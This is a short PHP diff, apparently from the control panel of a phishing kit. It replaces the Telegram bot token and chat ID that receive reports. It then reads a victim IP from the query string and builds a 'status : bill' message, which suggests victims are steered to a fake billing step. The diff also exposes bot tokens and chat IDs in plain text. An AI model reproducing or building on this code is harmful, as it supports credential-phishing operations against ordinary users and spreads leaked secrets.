@@ -3,8 +3,8 @@ session_start();
 if(isset($_SESSION["username"])) {
 
 if(isset($_GET['messageId'])){
-$botToken = "6887294087:AAEC802yB2ffTk_d0HaC43X6tv3VTnaHTOs";
-$chatID = "-4196036211";
+$botToken = "6690006825:AAEnkGpugYNl1PQbquMqeeJWVplp620y2vM";
+$chatID = "-4271405120";
 	$messageId=$_GET['messageId'];
 	$ipzebi=$_GET['ipzebi'];
 	$message ="IP: $ipzebi , status : bill";
